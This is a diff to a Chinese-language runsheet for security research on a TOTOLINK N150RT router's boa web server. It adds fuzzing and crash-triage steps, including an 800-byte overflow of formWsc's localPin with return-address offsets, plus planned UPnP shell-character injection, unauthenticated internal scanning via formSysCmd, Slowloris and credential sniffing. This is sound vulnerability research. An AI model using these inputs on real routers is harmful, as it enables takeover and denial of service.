@@ -34,16 +34,21 @@
 | `A1.2` | 從一份 clone 跑到全部報告，外加 166 個守衛案例 | — |
 | `A1.3` | 從 dump 讀出 bootloader 能不能傳 kernel cmdline | `P9-1` |
 | `A1.4` | 用 qemu-user 把這台自己的 binary 跑在 x86 上 | `P3-0` `P3-6` `P0-9` |
+| `A1.5` | 分派表的第二個來源，六個 build 逐一比 | `P8-21` `P5-7` |
+| `A1.6` | 參數缺席、長度階梯、協定炸彈，輸入由閘門算出來 | `P4-5` `P4-6` `P4-8` `P4-9` |
+| `A1.7` | 崩潰定性：訊號、位址，以及那個位址在哪個段 | `P5-1` `P5-2` `P5-3` `P5-4` `P5-6` |
+| `A1.8` | 別的家族才有的路徑，在這一台上是什麼反應 | `P3-8` `P3-9` `P3-10` `P3-11` `P3-12` `P1-9` |
+| `A1.9` | 設定區差分：改一個已知值，再看哪幾個 byte 動了 | `P8-23` `P8-12` |
 | **第 2 站** | **板子停在 `<RealTek>`** | |
 | `A2.1` | 把 CP2102 與 USB 網卡交給 WSL | — |
 | `A2.2` | 連續 ESC 搶下 bootloader，停在 `<RealTek>` | `P0-2` |
 | `A2.3` | 純讀 64 KiB 設定區：還原點 + IoC 基準 | `P0-10` `P0-5` |
-| `A2.4` | 進救援模式，而且不上傳任何東西 | `P9-3` |
+| `A2.4` | 進救援模式，而且不上傳任何東西 | `P9-3` `P9-4` |
 | `A2.5` | **`FLW` 寫入演練 —— 全檔唯一不可逆的一節** | `P0-3` |
 | `A2.6` | **把設定區寫回去 —— 16 KiB，不是 8 個 byte** | `P10-10` |
 | **第 3 站** | **板子正常開機、web 服務中** | |
 | `A3.1` | 設好網段，並且**證明**封包是直連不是繞道 | `P1-1` |
-| `A3.2` | 一次冷開機同時量到「幾秒可服務」與 kernel cmdline | `P1-12` |
+| `A3.2` | 一次冷開機量到「幾秒可服務」與**開機後 601 秒的視窗** | `P1-12` `P2-11` |
 | `A3.3` | 抓封包證明線上只有你和它，而且帶對照組 | `P0-4` |
 | `A3.4` | 全 TCP + 重點 UDP + IoC 埠 | `P1-2` `P6-11` `P1-10` |
 | `A3.5` | GET 那半邊：指紋、授權閘門、寫入類 handler | `P1-3` `P1-5` `P1-8` `P2-1` `P2-2` `P2-3` `P2-4` `P2-5` `P3-13` |
@@ -55,6 +60,17 @@
 | `A3.11` | **未認證改管理密碼，以及把它設成空字串** | `P10-3` `P10-4` |
 | `A3.12` | **會把 `boa` 弄掉的那一梯次 —— 排在最後** | `P4-1` `P4-2` `P4-3` `P4-4` `P2-6` |
 | `A3.13` | 三個 GET：未初始化的憑證對，以及 `Host` 檢查與反射 | `P2-9` `P8-5` |
+| `A3.14` | UDP 那一輪，而且它是第一次跑不是重跑 | `P6-4` `P6-6` `P6-7` `P6-8` `P6-12` |
+| `A3.15` | UPnP：SSDP、SOAP，以及把 LAN-only 推上 WAN | `P6-1` `P6-2` `P6-3` `P8-7` |
+| `A3.16` | DNS 身分，以及拔掉 WAN 之後 | `P6-9` `P6-10` |
+| `A3.17` | CSRF 與 DNS rebinding | `P8-3` `P8-4` `P8-6` |
+| `A3.18` | 假上游：NTP / DDNS / DHCP / PPPoE / SIP | `P8-11` `P8-19` `P6-5` |
+| `A3.19` | 儲存型注入：八個欄位裡測得到的三個 | `P8-2` |
+| `A3.20` | 借合法功能做偵察，以及一個便宜的可用性測試 | `P8-14` `P8-16` |
+| `A3.21` | 線上的明文憑證，與驅動的私有 ioctl | `P8-17` `P8-20` |
+| `A3.22` | 無線指紋與登入計時 | `P1-11` `P2-10` |
+| `A3.23` | 把桌面算出來的兩份清單拿到矽上 | `P5-6` `P1-7` |
+| `A3.24` | **Reset 按鈕：全場最後一發** | `P9-9` |
 | **第 4 站** | **收工 —— 不碰裝置** | |
 | `A4.1` | 把結果登記進去，重生成登記簿 | — |
 | `A4.2` | 症狀 → 原因 → 回到哪一節 | — |
@@ -526,6 +542,284 @@ TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
 
 ---
 
+### A1.5 分派表的第二個來源：六個 build 逐一比（關 `P8-21` · `P5-7`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| **T1**（一份 clone + `make fetch` 抓得到的映像） | 沒有碰裝置 | [`RUNBOOK` §8.12.23](RUNBOOK.md) | 2026-08-18 |
+
+**先決條件**：`make fetch` 與 `tools/unpack-firmware.sh` 跑過，六個 rootfs 都在
+`$FWRE_WORK/extracted/` 底下。
+
+**這個 repo 對 `root_form[]` 一直只有一個來源，而那是它自己的規矩不允許的。**
+這些 binary 是 `sstrip` 過的、一個 section header 都沒有，所以 `readelf` 幫不上忙。
+`tools/formtable-scan.py` 不讀指令，只讀 program header 與可寫段裡的資料。
+
+```bash
+python3 tools/formtable-scan.py \
+    "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
+    --compare reports/ghidra-formtable-unit-2018.json
+```
+
+```text
+squashfs-root  97 candidate pairs, 2 run(s)
+    0x00483610   40 entries  some other array of (string, function) pairs
+    0x00483758   57 entries  root_form (a dispatch table)
+
+  vs reports/ghidra-formtable-unit-2018.json: 57 agree, 0 ghidra-only, 0 scan-only
+```
+
+#### A1.5.1 六個 build 一起掃，而差集就是這一週的差分結果
+
+```bash
+python3 tools/formtable-scan.py \
+    "$FWRE_WORK/extracted/v2.1.2/squashfs-root/bin/boa" \
+    "$FWRE_WORK/extracted/n300rt-2.1.6/squashfs-root/bin/boa" \
+    "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
+    "$FWRE_WORK/extracted/n200re-3.2.0/squashfs-root/bin/boa" \
+    "$FWRE_WORK/extracted/n300rt-3.4.0/squashfs-root/bin/boa" \
+    "$FWRE_WORK/extracted/v3.4.0/squashfs-root/bin/boa" \
+    --json reports/formtable-scan-six-builds.json
+```
+
+```text
+2015-08 N150RT      59 handlers        2018-03 N200RE      60 handlers
+2016-05 N300RT      61 handlers        2019-03 N300RT      50 handlers
+2017-11 N150RT-CX   57 handlers ←這台  2020-10 N150RT      49 handlers
+```
+
+**兩件要記的事，第二件比第一件重要：** 這一台的 57 個是 N300RT V2.1.6 那 61 個的
+**嚴格子集**；而 `formSysCmd` 在 N150RT V3.4.0 裡不在了，在 19 個月更早的
+N300RT V3.4.0-B20190315 裡**還在** —— 廠商的移除是逐產品的，不是逐版本號的。
+
+> ⚠️ **方法只在一個 build 上被驗證過。** `--compare` 證明它在 `unit-2018` 上與
+> Ghidra 逐項相同；另外五個沒有對照可比。**這句話要跟結論一起被引用。**
+
+---
+
+### A1.6 參數缺席、長度階梯、協定炸彈：輸入清單由閘門自己算出來（關 `P4-5` · `P4-6` · `P4-8` · `P4-9`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置。**會改 dump 的副本**，每一發之前完整還原 | [`RUNBOOK` §8.12.24](RUNBOOK.md) | 2026-08-18 |
+
+**先決條件**：`A1.4` 的模擬環境站得起來（`sudo tools/qemu-env.sh check` 三個
+control 全過）。
+
+```bash
+sudo python3 tools/paramfuzz.py --out reports/paramfuzz-unit-2018.json
+```
+
+```text
+  control  negative: formSchedule with no webpage (must be DETECTED as dead)
+  control  positive: formNtp with no body (must SURVIVE)
+  ladder   11 handlers x 17 parameters x 5 lengths (stack destinations only)
+    DEAD  ladder     formWsc                localPin       800 bytes
+    DEAD  ladder     formWsc                localPin       4096 bytes
+  cyclic   11 handlers, 4096-byte de Bruijn pattern (stack destinations only)
+    DEAD  cyclic     formWsc                localPin       de Bruijn 4096
+  absent   every declared parameter present except one
+    DEAD  absent     formAdvanceSetup       submit-url     omitted
+    DEAD  absent     formDnsv6              submit-url     omitted
+    DEAD  absent     formOpMode2            submit-url     omitted
+    DEAD  absent     formSSH                submit-url     omitted
+    DEAD  absent     formSchedule           webpage        omitted
+
+  208 requests, 8 deaths, 0 harness anomalies
+```
+
+> 🔴 **負對照才是承重的那一個。** `P4-9` 凍結的反證條件原本點名「`P4-3` 的已知崩潰」，
+> 而 `P4-3` 在這台已判 `refuted` —— **那個對照不存在，條件永遠無法構成**。
+> 2026-08-18 開火前換成 `formSchedule`，凍結雜湊在同一個 commit 裡改，
+> 理由在 `PROGRESS.md § Corrections`。
+
+單獨跑某一個維度（省時間，**但不要拿單維度的結果當一輪**）：
+
+```bash
+sudo python3 tools/paramfuzz.py --dimension absent --out /tmp/absent.json
+```
+
+---
+
+### A1.7 崩潰定性：訊號、位址，以及那個位址在哪一個段裡（關 `P5-1` · `P5-2` · `P5-3` · `P5-4` · `P5-6`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.25](RUNBOOK.md) | 2026-08-18 |
+
+**先決條件**：`A1.6` 已經產出一份死亡清單。這一節吃那份清單。
+
+#### A1.7.1 五個「參數缺席就死」的，全部死在同一個位址
+
+```bash
+sudo python3 tools/crash-triage.py \
+    --case formSchedule: --case formAdvanceSetup: --case formDnsv6: \
+    --case formOpMode2: --case formSSH: \
+    --case "formSchedule:webpage=/status.htm" \
+    --control formNtp: --control formWlanSetup: \
+    --out reports/crash-triage-unit-2018.json
+```
+
+```text
+formSchedule       SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
+formAdvanceSetup   SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
+formDnsv6          SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
+formOpMode2        SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
+formSSH            SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
+formSchedule       no signal
+```
+
+`0x004725d0` 是被 `addiu` 取址 **815 次**的 pooled `""` 字面量，
+而它在 `R-X` 的 PT_LOAD 裡（`0x00400000`–`0x00473044`）：
+
+```bash
+python3 tools/mipsref.py "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
+        --addr 0x004725d0
+```
+
+> 🔴 **最後一列是這一節最強的對照，而它是免費的。**
+> `webpage=`（**有值但空**）走的是同一條分支、`*s2` 一樣是 `0`、`strcpy` 一樣跑，
+> **卻活著**。差別只在指標指到哪裡，不在分支跑不跑。
+
+#### A1.7.2 那個會讓 `$pc` 完全可控的
+
+```bash
+sudo python3 tools/crash-triage.py \
+    --case "formWsc:localPin=$(python3 -c 'print("A"*800)')" \
+    --control formWsc:localPin=1234 --control formNtp: \
+    --out reports/crash-triage-unit-2018-wsc.json
+```
+
+```text
+pc  0x41414141    ra  0x41414141    s0..s6  0x41414141    s7  0x0048bb04
+```
+
+用 de Bruijn 樣式跑同一發，偏移直接讀得出來：
+
+```text
+481 s0 · 485 s1 · 489 s2 · 493 s3 · 497 s4 · 501 s5 · 505 s6 · 509 ra
+```
+
+**509 bytes 到 saved return address**，與 `BoaGate` 對 `localPin` 報的 `sp-540` 一致。
+260 bytes 活著、800 bytes 死掉。
+
+> 🔴 **這一發的完整請求不進 committed 檔案**，規則與 `A3.13` 的 `D-15` 相同：
+> 請求本體放 `$FWRE_WORK/disclosure/`。這一節負責的是位址、偏移與對照。
+
+同一發在**公開映像**上跑一次，因為那決定這個發現是「任何人可以驗」還是「只在一個
+沒人下載得到的 build 上」。**對照組必須換掉**：
+
+```bash
+sudo python3 tools/crash-triage.py --profile v2.1.2 \
+    --case "formWsc:localPin=$(python3 -c 'print("A"*800)')" \
+    --case "formWsc:localPin=" \
+    --control formSelLang: \
+    --out reports/crash-triage-v2.1.2-wsc.json
+```
+
+```text
+formWsc                SIGSEGV
+formWsc                no signal
+```
+
+偏移用 de Bruijn 樣式各跑一發，兩個 profile 都跑，才比得出差別：
+
+```bash
+sudo python3 tools/crash-triage.py --profile v2.1.2 \
+    --case "formWsc:localPin=$(python3 -c "import sys; sys.path.insert(0,'tools'); from paramfuzz import cyclic; print(cyclic(800))")" \
+    --control formSelLang: \
+    --out reports/crash-triage-v2.1.2-wsc-cyclic.json
+```
+
+```text
+unit-2018   s0..s6 = 481 485 489 493 497 501 505    ra = 509    s7 = 0x0048bb04
+v2.1.2      s0..s6 = 485 489 493 497 501 505 509    ra = 513    s7 = 0x00490ad4
+```
+
+> 🔴 **`--control formNtp:` 與 `--control formWsc:localPin=1234` 在 `v2.1.2`
+> 上都不是對照組，而兩個失效的方式不一樣。**前者會 SIGSEGV（它在那個 build 上就
+> 是「參數缺席就死」的七個之一）；後者**會讓 guest 重開機**——它的 syscall trace
+> 結尾是 `execve("/bin/sh",{"sh","-c","reboot -f"})`。兩個 build 都活著的是
+> `formSelLang:`。
+>
+> **在一個 build 上量出來的對照組，不是另一個 build 上的對照組。**
+
+#### A1.7.3 兩個坑，兩次都各花掉一場
+
+1. **`boa` 會 daemonize。** gdbstub 底下 gdb 跟的是父行程，它馬上結束。`-d` 讓它
+   留在前景；旗標寫在 binary 自報的 usage 裡。
+2. **SIGBUS 要放行，不能停。** 帶 `--alignfix` 時 firmware 每寫一次設定就吃掉幾十個
+   SIGBUS，那是設計如此。
+
+---
+
+### A1.8 別的家族才有的路徑，在這一台上是什麼反應（關 `P3-8` · `P3-9` · `P3-10` · `P3-11` · `P3-12` · `P1-9`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.26](RUNBOOK.md) | 2026-08-18 |
+
+```bash
+sudo python3 tools/paramfuzz.py --dimension paths --out /tmp/paths.json
+```
+
+**這五列的反證條件逐字相同**：任何一個有回應，`root_form[]` 就不是唯一的
+dispatch 來源。而「有回應」四個字是這一節唯一困難的地方 —— 字典裡最後三行是
+對照組，一個 `/boafrm/` 的、一個 `/cgi-bin/` 的、一個 `.htm` 的，
+**三個都是保證沒有人實作得出來的名字**。
+
+> 🔴 **第一版的 GET 對每一個路徑都回 `200` 與 2,895 bytes，包含那個不可能存在的
+> `.htm`。** 原因是 urllib 預設跟隨轉址，而這台對沒豁免的路徑回 `302 → home.htm`。
+> **一個會跟隨轉址的存在性探測，量到的是轉址。** 現在的版本不跟隨，並記錄
+> `Location`。**是對照組抓到的，不是結果抓到的。**
+
+---
+
+### A1.9 設定區差分：改一個已知的值，再看是哪幾個 byte 動了（關 `P8-23` · `P8-12`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.27](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**這一節到 2026-08-18 之前做不了，理由不是難，是模擬環境寫不了設定。**
+`tools/alignfix/` 補掉那一個對齊差異之後，它第一次不需要裝置。
+
+```bash
+sudo python3 tools/config-diff.py --profile unit-2018 \
+    --mib DHCP_LEASE_TIME --to 4321 \
+    --out reports/config-diff-unit-2018.json
+```
+
+```text
+DHCP_LEASE_TIME: 480 -> 4321   (12 unaligned stores fixed up)
+flash image: 3 byte(s) changed
+  0x00c060  0x01 -> 0x10   inside the compressed payload -- NOT comparable to a decoded field offset
+  0x00c062  0xe0 -> 0xe1   inside the compressed payload -- NOT comparable to a decoded field offset
+  0x00dd41  0xa8 -> 0x98   after the compressed payload (+11 past its end)
+decoded table: 1 field(s) changed
+  offset 91     len 4   DHCP_LEASE_TIME          000001e0 -> 000010e1
+the two paths name the same field, and only that field.
+```
+
+**`P8-23` 的反證條件是「差分出來的欄位跟 Decode 出來的不一致」，而工具在兩個方向
+都會拒絕**：解出來一個欄位都沒動（解碼器看不到這次寫入），或者動的不只一個
+（寫入沒有侷限在那個欄位）。兩種都以 exit 2 收場，並且把多出來的欄位名字印出來。
+
+> 🔴 **這一節第一版寫錯兩次，而兩次都是「跑過才會知道」。**
+> 一、`flash set` 沒有 `LD_PRELOAD=/lib/alignfix.so` **不會結束**：guest 印出
+> `qemu: uncaught target signal 10 (Bus error) - core dumped` 之後就卡著，看起來
+> 像慢，不像壞。工具現在自己帶那個 preload，而且設了 90 秒上限。
+> 二、第一版叫人拿 `qemu-env.sh diff` 的位移去跟 `fwrecon compcs` 的欄位表比，
+> **那兩個不在同一個座標系**——設定區是壓縮的（7,478 → 45,226），前者是壓縮後的
+> 位移，後者是解壓後的。第一次跑出來差 2 bytes、看起來「差不多對」。工具現在把
+> 每一個變動的 byte 標成「在壓縮酬載內／在其後第幾個 byte」，**標示，而不是拿去比**。
+
+`P8-12` 卡在自家工具而不是裝置：`fwrecon compcs` 只有 decode，沒有 encoder。
+不過 `config-diff.py` 已經證明得出一次寫入落在哪個欄位，所以卡住的是編碼那一步，
+不是差分那一步。
+
+---
+
 ## 第 2 站 · 板子停在 `<RealTek>`
 
 **照順序** `A2.1` → `A2.2` → `A2.3` → `A2.4` → `A2.5` → `A2.6`
@@ -817,7 +1111,7 @@ differing     : 0
 
 ---
 
-### A2.4 🔌 救援路徑 —— 非破壞性上限（關 `P9-3`）
+### A2.4 🔌 救援路徑 —— 非破壞性上限（關 `P9-3` · `P9-4`）
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
@@ -1456,7 +1750,7 @@ cat "/sys/class/net/$IF/statistics/rx_packets"
 
 ---
 
-### A3.2 🔌 冷開機計時（一次上電餵三項）（關 `P1-12`）
+### A3.2 🔌 冷開機計時，以及開機後 601 秒的視窗（一次上電餵四項）（關 `P1-12` · `P2-11`）
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
@@ -3046,6 +3340,188 @@ Location: http://evil.example/login.htm
 
 ---
 
+### A3.14 🔌 UDP 那一輪，而且它是第一次跑不是重跑（關 `P6-4` · `P6-6` · `P6-7` · `P6-8` · `P6-12`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **純讀。**不寫、不斷電 | [`RUNBOOK` §8.12.28](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**先決條件**：`A3.1` 的網段已設好。
+
+```bash
+sudo nmap -sU -p 53,161,1900,5060,9034,9999,20005 -sV --version-intensity 2 10.1.1.1
+sudo nmap -sT -p 5555,7547 10.1.1.1
+```
+
+**預期**：9034 / 9999 / 20005 無回應；**而同一輪裡 1900 或 53 有回應當正對照**。
+
+> 🔴 **沒有正對照的「全部關閉」量到的是鏈路，不是裝置。** UDP 沒有交握，
+> 「沒有回應」與「封包沒送到」在觀測上完全相同。
+
+---
+
+### A3.15 🔌 UPnP：SSDP、SOAP，以及把 LAN-only 推上 WAN（關 `P6-1` · `P6-2` · `P6-3` · `P8-7`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **會建立一個埠映射，而這一節負責把它刪掉** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+```bash
+python3 tools/bench-probe.py ssdp --host 10.1.1.1 -o dumps/w07-ssdp.json
+```
+
+> 🔴 **SOAP 的路徑是 `/upnp/control/WANIPConnection`，不是手冊寫的 `WANIPConn1`。**
+> 錯的路徑會讓一整輪回 404，看起來像「這台沒有 UPnP」——而 `P1-10` 已經量到 52869 是開的。
+> **一個錯的路徑產生的是一個假的否定。**
+
+`AddPortMapping` 的四個欄位帶 shell 字元（`P6-1`，CVE-2014-8361），
+`NewInternalClient` 填 `10.1.1.1`（`P8-7`）。**做完必須把映射刪掉，而且在同一節裡完成。**
+
+---
+
+### A3.16 🔌 DNS 身分，以及拔掉 WAN 之後（關 `P6-9` · `P6-10`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **會拔 WAN 線。**不寫設定 | [`RUNBOOK` §8.12.30](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+```bash
+dig @10.1.1.1 version.bind chaos txt
+dig @10.1.1.1 +short example.com
+```
+
+**`P6-9` 要的是「在聽的是哪一支」** —— `dnrd` / `dnsmasq` / `dns_protocl` 三選一，
+不是「有沒有 DNS」。**`P6-10` 拔掉 WAN 線之後重跑同兩發**，看行為改不改變。
+
+---
+
+### A3.17 🔌 CSRF 與 DNS rebinding（關 `P8-3` · `P8-4` · `P8-6`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **`P8-4` 會改管理密碼**，所以它排在 `A3.11` 之後 | [`RUNBOOK` §8.12.31](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+> 🔴 **卡片必須引用 CVE-2023-47677（Talos）**：同一顆 SDK 的 `boa` 有 CSRF 缺陷，
+> 而且**有**一個可用 iframe 繞過的防護。**凍結的預測不改**，但不引用的話，
+> 結果會被讀成這個專案的發現。**而 Talos 描述的機制不是這個 binary 裡的那一個
+> （這裡是 IP 比對加 uptime 過期），兩者是不是同一個功能沒有解決，卡片照這樣寫。**
+
+---
+
+### A3.18 🔌 假上游：NTP / DDNS / DHCP / PPPoE / SIP（關 `P8-11` · `P8-19` · `P6-5`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **要一台假 ISP 接在 WAN 側** | [`RUNBOOK` §8.12.32](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**三列共用同一套器材，分開架等於把最貴的準備工作做三遍。**
+
+已經知道的一件事先講，免得被當成新發現：`/usr/share/udhcpc/eth1.bound` 是一行
+`sysconf conn dhcp $interface $ip $subnet $router $dns`，值變成 argv 而不是命令，
+而且 `hostname` 與 `domain` **根本沒有被傳進去**。**這一節要問的是往 `sysconf`
+裡面移的那一跳。**
+
+---
+
+### A3.19 🔌 儲存型注入：八個欄位裡這一週測得到的三個（關 `P8-2`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **會寫入設定**，前後各一份 64 KiB 快照 | [`RUNBOOK` §8.12.33](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**測得到的三個**：UPnP 的 `NewPortMappingDescription`、`formSysLog` 那一組
+（失敗登入的帳號名與 `User-Agent`）、PPPoE server name（與 `A3.18` 同一趟）。
+**打不到的五個要寫成打不到，不能寫成「未觀察到」。**
+
+**每一個都先讀模板再送封包** —— docroot 的 143 個檔在 dump 裡，有沒有輸出編碼讀得出來。
+
+---
+
+### A3.20 🔌 借合法功能做偵察，以及一個便宜的可用性測試（關 `P8-14` · `P8-16`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **做完之後 `boa` 很可能不在了** | [`RUNBOOK` §8.12.34](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+`P8-14` 用 `formSysCmd`（**出廠就有的功能**，`P3-3` 已證明未認證可達）掃內網。
+**量到的是一個合法功能的影響範圍，不是一個新的洞。**
+
+`P8-16`（Slowloris）排同一節：`boa` 是單一 process，**同時連線數的上限就是可用性的上限**。
+
+> 🔴 **這一節排在需要 web server 的每一節之後，排在 `A3.24` 之前。**
+
+---
+
+### A3.21 🔌 線上的明文憑證，與驅動的私有 ioctl（關 `P8-17` · `P8-20`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **純讀。**一個 `tcpdump` | [`RUNBOOK` §8.12.35](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+```bash
+sudo tcpdump -i eth1 -s0 -w dumps/w07-creds.pcap 'host 10.1.1.1 and tcp port 80'
+```
+
+**反證條件才是重點**：抓到的封包裡密碼**不是**明文 → 有某種前端雜湊，
+那要回去讀 `w6cg` 裡的 JS。`P8-20` 這一週只做靜態那一半，**「拿到 shell 之後」
+要寫成條件句。**
+
+---
+
+### A3.22 🔌 無線指紋與登入計時（關 `P1-11` · `P2-10`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **純讀** | [`RUNBOOK` §8.12.36](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+`P1-11` 用途是**否證一個排除理由**：掃到 5 GHz 或 SAE，`E-8` 的排除就不成立。
+
+`P2-10` **預期會失敗**，而它的反證條件寫得很清楚：分佈重疊要記成
+**方法限制**而不是「沒有時間差」。**這兩句話在資料上長得一模一樣。**
+
+---
+
+### A3.23 🔌 把桌面算出來的兩份清單拿到矽上（關 `P5-6` · `P1-7`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **第一發會把 `boa` 弄掉，要斷電** | [`RUNBOOK` §8.12.37](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**分成兩發，而且不准混在同一張卡上：**
+
+1. `formSchedule`，**缺 `webpage`**。預期：web server 消失且不會自己回來。
+2. 另外抽 2–3 個原本在那 39 個裡、現在活著的（`formNtp`、`formDMZ`）。
+   **預期：它們在矽上會活著**，因為核心會補對齊。
+
+> ⚠️ **第二發的反證條件比第一發的預測重要。** 如果那 2–3 個在實機上也死掉，
+> **對齊那套解釋就是錯的**，而 `tools/alignfix` 打開之後量到的每一件事、
+> 以及 `bughunt.md` 第 16 列的改寫，全部退回原點。
+
+`P1-7` 在同一節：**實機上要看 `302` 的目的地不是狀態碼**，那個錯桌面上犯過一次。
+
+---
+
+### A3.24 🔌🔴 Reset 按鈕：全場最後一發（關 `P9-9`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **不可逆。**它抹掉前面每一項站著的地面 | [`RUNBOOK` §8.12.38](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+
+**在按下去之前，這一場所有的紀錄卡都要先寫完。**
+
+前後各一份 `H601` 快照，而且這一步不可以省：
+
+```bash
+python3 tools/console-dump.py dump --at-prompt --flash 0x3F0000 --length 0x1000 \
+        --ram 0x80560000 --chunk 512 -o dumps/w07-h601-pre.bin
+```
+
+**預期**：`COMPCS` 變回 `COMPDS`，而 **`H601` UNCHANGED**。
+`H601` 放的是這一台獨有的 MAC 與射頻校準 —— 如果 reset 把它蓋掉，
+**這台就永久地不再是它自己了，而且不會有任何錯誤訊息。**
+
+---
+
 ## 第 4 站 · 收工 —— 不碰裝置
 
 **照順序** `A4.1` → `A4.2`
@@ -3290,6 +3766,43 @@ Part A 是 `A0`→`A14`，而下面 W05 那兩列的實際順序是 `A0`→`A2`�
 
 ---
 
+## B-W07 增補（2026-08-18 桌面第二場，寫在進站之前）
+
+**上面那張表不改，一個字都不改。** 這是照它原本的編號往下接的增補，而它存在的
+理由跟本節「只追加」的規則是同一個：**改動要能被 diff 證明是事先做的。**
+
+**桌面那一場又跑了一次，而且它把登記簿從 11/58 推到 28/58。** 新增五節作業單
+（`A1.5`–`A1.9`），全部在第 1 站，全部不碰裝置。
+
+| 場次 | 順序 | 本週特有 |
+|---|---|---|
+| 桌面 ②（已完成） | `A1.1` → `A1.5` → `A1.6` → `A1.7` → `A1.8` | 六個 build 的分派表第二來源；`formWsc` 的 `$pc` 完全可控 |
+
+**進站那一場的順序改了，而且是因為量到的東西改了，不是因為想法改了：**
+
+| 場次 | 順序 | 改在哪裡 |
+|---|---|---|
+| 第 3 站 ① | `A3.1` → `A3.7` → **`A3.13`** → `A3.2` | **`A3.2` 前移**，因為 `P2-11`（601 秒視窗）要它的時鐘，而視窗只有上電後十分鐘 |
+| 第 3 站 ② | `A3.14` → `A3.15` → `A3.16` | UDP 重掃 / UPnP / DNS 身分，三節取代原本的一格 |
+| 第 3 站 ③ | `A3.19` → `A3.18` | 改設定那批，`A3.18` 要假 ISP 所以排在後面 |
+| 第 3 站 ④ | **`A3.23`** | 抽樣那一格：原本寫「39 個裡挑 3–4 個，`formWsc` 第一個」，**39 這個數字已經被推翻**，現在是五個有名字的加 2–3 個對照 |
+| 第 3 站 ⑤ | `A3.11` → `A3.17` → `A3.22` → `A3.20` → **`A3.24` 最後** | `A3.20` 做完 `boa` 很可能不在，所以排在需要它的每一節之後 |
+
+**這一次增補改掉的三件事，逐條寫在這裡而不是改上面那張表：**
+
+1. **`A3.13` 的措辭要改，位置不改。** 那兩個「沒人寫」的緩衝區是
+   `MIB_SUPER_NAME`(180) / `MIB_SUPER_PASSWORD`(181)，三個 build 沒有一個取過它們。
+   卡片不能再寫「取得比真實憑證更高的權限層級」，正確的是**「整段授權閘門不執行」**。
+2. **`A3.2` 多了一項，而它原本連程序都不存在。** `P2-11` 是 2026-08-18 才入冊的，
+   凍結在進站之前 —— 這是 `tools/check-runsheet.py` 新規則存在的直接理由。
+3. **抽樣那一格從「39 選 3–4」變成「五個，而且都有名字」**，理由在
+   `RUNBOOK` §8.12.37。
+
+**這一週實際發生了什麼、以及儀器缺陷 44** → [`BENCH-LOG.md`](BENCH-LOG.md)。
+**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。
+
+---
+
 # 附錄 關掉的項目為什麼由機器維護
 
 **[`test-ledger.md`](test-ledger.md) 裡每一個有結果的項目，都必須有一節可以走到它。**
@@ -3365,3 +3878,40 @@ P2-9 的桌面半邊、P8-1 P8-5 P8-8 P8-10 P8-18 P8-24 P9-13 P10-7 ——
 > **檢查器看不到它們，因為它只讀 `runsheet.md`。**
 > 所以修法不是「去檢查 §8.12 的命令」，是**讓它不准有命令** ——
 > 一個不准放命令的段落裡，不可能有過期的命令。
+
+---
+
